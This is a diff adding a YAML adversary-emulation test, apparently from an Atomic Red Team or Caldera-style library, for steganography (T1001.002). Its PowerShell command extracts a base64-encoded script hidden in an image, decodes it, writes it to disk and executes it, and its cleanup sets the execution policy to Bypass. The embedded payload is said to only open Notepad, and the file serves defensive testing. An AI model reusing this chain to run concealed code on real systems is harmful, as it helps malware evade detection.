@@ -1,0 +1,43 @@
+---
+- id: 67a341a9d6d8fff89c0a04379adcec17
+  name: Embedded Script in Image Execution via Extract-Invoke-PSImage
+  description: "This atomic test demonstrates the technique of data obfuscation via\
+    \ steganography, where a PowerShell script is concealed within an image file.\
+    \ \nThe PowerShell script is embedded using steganography techniques, making it\
+    \ undetectable by traditional security measures. The script is hidden \nwithin\
+    \ the pixels of the image, enabling attackers to covertly transfer and execute\
+    \ malicious code across systems.\n\nThe test begins by ensuring the availability\
+    \ of the malicious image file and the Extract-Invoke-PSImage script. The test\
+    \ proceeds to extract the hidden \nPowerShell script (decoded.ps1) from the image\
+    \ file using the Extract-Invoke-PSImage tool. The extracted script is then decoded\
+    \ from base64 encoding and saved as a \nseparate PowerShell (textExtraction.ps1).\
+    \ Consequently, the textExtraction.ps1 script is executed.\n\nIn the case of this\
+    \ atomic test, the malicious image file which is downloaded has the powershell\
+    \ command Start-Process notepad embedded within in base64. This\nis done to emulate\
+    \ an attackers behaviour in the case they were to execute malware embedded within\
+    \ the image file. \n"
+  tactic: command-and-control
+  technique:
+    attack_id: T1001.002
+    name: Data Obfuscation via Steganography
+  platforms:
+    windows:
+      psh:
+        command: cd "PathToAtomicsFolder\ExternalPayloads\"; Import-Module .\Extract-Invoke-PSImage.ps1;
+          $extractedScript=Extract-Invoke-PSImage -Image "PathToAtomicsFolder\T1001.002\bin\evil_kitten.jpg"
+          -Out "$HOME\result.ps1"; $scriptContent = Get-Content "$HOME\result.ps1"
+          -Raw; $base64Pattern = "(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])";
+          $base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object
+          { $_.Value }; $base64Strings | Set-Content "$HOME\decoded.ps1"; $decodedContent
+          = Get-Content "$HOME\decoded.ps1" -Raw; $decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decodedContent));
+          $textPattern = '^.+'  ; $textMatches = [regex]::Matches($decodedText, $textPattern)
+          | ForEach-Object { $_.Value }; $scriptPath = "$HOME\textExtraction.ps1";
+          $textMatches -join '' | Set-Content -Path $scriptPath; . "$HOME\textExtraction.ps1"
+        payloads: []
+        cleanup: Set-ExecutionPolicy Bypass -Scope Process -Force -ErrorAction Ignore;
+          Remove-Item -Path "$HOME\result.ps1" -Force -ErrorAction Ignore ; Remove-Item
+          -Path "$HOME\textExtraction.ps1" -Force -ErrorAction Ignore; Remove-Item
+          -Path "$HOME\decoded.ps1" -Force -ErrorAction Ignore
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
